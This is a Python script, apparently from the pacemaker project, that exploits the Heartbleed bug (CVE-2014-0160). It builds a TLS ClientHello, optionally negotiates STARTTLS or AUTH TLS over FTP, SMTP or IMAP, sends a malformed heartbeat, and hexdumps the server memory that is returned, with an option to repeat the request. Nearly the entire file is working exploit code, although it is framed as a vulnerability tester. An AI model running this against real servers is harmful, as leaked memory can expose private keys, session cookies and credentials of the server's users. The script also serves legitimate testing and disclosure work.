#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the server
# Author: Peter Wu <peter@lekensteyn.nl>
# Licensed under the MIT license <http://opensource.org/licenses/MIT>.

import socket
import sys
import struct
import time
from argparse import ArgumentParser

# Hexdump etc
from pacemaker import hexdump, make_heartbeat, read_record, read_hb_response
from pacemaker import Failure

parser = ArgumentParser(description='Test servers for Heartbleed (CVE-2014-0160)')
parser.add_argument('host', help='Hostname to connect to')
parser.add_argument('-6', '--ipv6', action='store_true',
        help='Enable IPv6 addresses (implied by IPv6 listen addr. such as ::)')
parser.add_argument('-p', '--port', type=int, default=443,
        help='TCP port to connect to (default %(default)d)')
# Note: FTP is (Explicit FTPS). Use TLS for Implicit FTPS
parser.add_argument('-s', '--service', default='tls',
        choices=['tls', 'ftp', 'smtp', 'imap'],
        help='Target service type (default %(default)s)')
parser.add_argument('-t', '--timeout', type=int, default=3,
        help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
parser.add_argument('-x', '--count', type=int, default=1,
        help='Number of Hearbeats requests to be sent (default %(default)d)')

def make_clienthello(sslver='03 01'):
    # openssl ciphers -V 'HIGH:!MD5:!PSK:!DSS:!ECDSA:!aNULL:!SRP' |
    # awk '{gsub("0x","");print tolower($1)}' | tr ',\n' ' '
    ciphers = '''
    c0 30 c0 28 c0 14 00 9f 00 6b 00 39 00 88 c0 32
    c0 2e c0 2a c0 26 c0 0f c0 05 00 9d 00 3d 00 35
    00 84 c0 12 00 16 c0 0d c0 03 00 0a c0 2f c0 27
    c0 13 00 9e 00 67 00 33 00 45 c0 31 c0 2d c0 29
    c0 25 c0 0e c0 04 00 9c 00 3c 00 2f 00 41
    '''
    ciphers_len = len(bytearray.fromhex(ciphers.replace('\n', '')))

    # Handshake type and length will be added later
    hs = sslver
    hs += 32 * ' 42'    # Random
    hs += ' 00'         # SID length
    hs += ' 00 {:02x}'.format(ciphers_len) + ciphers
    hs += ' 01 00 '     # Compression methods (1); NULL compression
    # Extensions length
    hs += ' 00 05'      # Extensions length
    # Heartbeat extension
    hs += ' 00 0f'      # Heartbeat type
    hs += ' 00 01'      # Length
    hs += ' 01'         # mode (peer allowed to send requests)

    hs_data = bytearray.fromhex(hs.replace('\n', ''))
    # ClientHello (1), length 00 xx xx
    hs_data = struct.pack('>BBH', 1, 0, len(hs_data)) + hs_data

    # Content Type: Handshake (22)
    record_data = bytearray.fromhex('16 ' + sslver)
    record_data += struct.pack('>H', len(hs_data))
    record_data += hs_data
    return record_data

def skip_server_handshake(sock, timeout, sslver):
    end_time = time.time() + timeout
    hs_struct = struct.Struct('!BBH')
    for i in range(0, 5):
        record, error = read_record(sock, timeout)
        timeout = end_time - time.time()
        if not record:
            raise Failure('Unexpected server handshake! ' + str(error))

        content_type, _, fragment = record
        if content_type != 22:
            raise Failure('Expected handshake type, got ' + str(content_type))

        off = 0
        while off + hs_struct.size <= len(fragment):
            hs_type, len_high, len_low = hs_struct.unpack_from(fragment, off)
            if off + len_low > len(fragment):
                raise Failure('Illegal handshake length!')
            # Server handshake is complete after ServerHelloDone
            if hs_type == 14:
                return
            off += hs_struct.size + len_low

def handle_ssl(sock, sslver='03 01'):
    # ClientHello
    sock.sendall(make_clienthello(sslver))

    # Skip ServerHello, Certificate, ServerKeyExchange, ServerHelloDone
    skip_server_handshake(sock, args.timeout, sslver)

    # Are you alive? Heartbeat please!
    try:
        sock.sendall(make_heartbeat(sslver))
    except socker.error as e:
        print('Unable to send heartbeat! ' + str(e))
        return False

    try:
        memory = read_hb_response(sock, args.timeout)
        if memory is not None and not memory:
            print('Possibly not vulnerable')
            return False
        elif memory:
            print('Server returned {0} ({0:#x}) bytes'.format(len(memory)))
            hexdump(memory)
    except socket.error as e:
        print('Unable to read heartbeat response! ' + str(e))
        return False

    # "Maybe" vulnerable
    return True

def test_server(host, port, timeout, prepare_func=None, family=socket.AF_INET):
    try:
        try:
            sock = socket.socket(family=family)
            sock.connect((host, port))
            sock.settimeout(timeout) # For writes, reads are already guarded
        except socket.error as e:
            print('Unable to connect to {}:{}: {}'.format(host, port, e))
            return False

        if prepare_func is not None:
            prepare_func(sock)
            print('Pre-TLS stage completed, continuing with handshake')

        return handle_ssl(sock)
    except (Failure, socket.error) as e:
        print('Unable to check for vulnerability: ' + str(e))
        return False
    finally:
        if sock:
            sock.close()

class Linereader(object):
    def __init__(self, sock):
        self.buffer = bytearray()
        self.sock = sock

    def readline(self):
        if not b'\n' in self.buffer:
            self.buffer += self.sock.recv(4096)
        nlpos = self.buffer.index(b'\n')
        if nlpos >= 0:
            line = self.buffer[:nlpos+1]
            del self.buffer[:nlpos+1]
            return line.decode('ascii')
        return ''

class Services(object):
    @classmethod
    def get_prepare(cls, service):
        name = 'prepare_' + service
        if hasattr(cls, name):
            return getattr(cls, name)
        return None

    @staticmethod
    def readline_expect(reader, expected, what=None):
        line = reader.readline()
        if not line.upper().startswith(expected.upper()):
            if what is None:
                what = expected
            raise Failure('Expected ' + expected + ', got ' + line)
        return line

    @classmethod
    def prepare_ftp(cls, sock):
        reader = Linereader(sock)
        tls = False
        cls.readline_expect(reader, '220 ', 'FTP greeting')

        sock.sendall(b'FEAT\r\n')
        cls.readline_expect(reader, '211-', 'FTP features')
        for i in range(0, 64):
            line = reader.readline().upper()
            if line.startswith(' AUTH TLS'):
                tls = True
            if line.startswith('211'):
                break

        if not tls:
            raise Failure('AUTH TLS not supported')

        sock.sendall(b'AUTH TLS\r\n')
        cls.readline_expect(reader, '234 ', 'AUTH TLS ack')

    @classmethod
    def prepare_smtp(cls, sock):
        reader = Linereader(sock)
        tls = False

        # Server greeting
        cls.readline_expect(reader, '220 ', 'SMTP banner')

        sock.sendall(b'EHLO pacemaker\r\n')
        # Assume no more than 16 extensions
        for i in range(0, 16):
            line = cls.readline_expect(reader, '250', 'extension')
            if line[4:].upper().startswith('STARTTLS'):
                tls = True
            if line[3] == ' ':
                break

        if not tls:
            raise Failure('STARTTLS not supported')

        sock.sendall(b'STARTTLS\r\n')
        cls.readline_expect(reader, '220 ', 'STARTTLS acknowledgement')

    @classmethod
    def prepare_imap(cls, sock):
        reader = Linereader(sock)
        # actually, the greeting contains PREAUTH or OK
        cls.readline_expect(reader, '* ', 'IMAP banner')

        sock.sendall(b'a001 STARTTLS\r\n')
        cls.readline_expect(reader, 'a001 OK', 'STARTTLS acknowledgement')

def main(args):
    family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
    prep_func = Services.get_prepare(args.service)

    # OpenSSL expects a client key exchange after its ServerHello.  After the
    # first heartbeat, it will reset the connection. That's why we cannot just
    # repeatedly send heartbeats as the client does. For that, we need to
    # complete the handshake, but that requires a different implementation
    # approach. For now just keep re-connecting, it will flood server logs with
    # handshake failures though.
    for i in range(0, args.count):
        if not test_server(args.host, args.port, args.timeout, \
            prepare_func=prep_func, family=family):
            break

if __name__ == '__main__':
    args = parser.parse_args()
    try:
        main(args)
    except KeyboardInterrupt:
        pass